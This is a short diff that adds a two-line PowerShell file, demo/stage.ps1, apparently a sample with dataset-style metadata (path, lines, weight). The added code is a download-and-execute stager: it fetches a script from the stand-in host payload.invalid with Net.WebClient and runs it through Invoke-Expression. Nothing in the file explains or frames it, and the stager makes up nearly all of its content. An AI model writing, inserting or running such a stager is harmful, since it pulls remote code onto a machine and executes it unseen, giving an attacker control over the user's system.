@@ -1,0 +1,6 @@
+# path: demo/stage.ps1
+# lines: 2
+# weight: 50
+# ---
+$code = (New-Object Net.WebClient).DownloadString("https://payload.invalid/s.ps1")
+Invoke-Expression $code
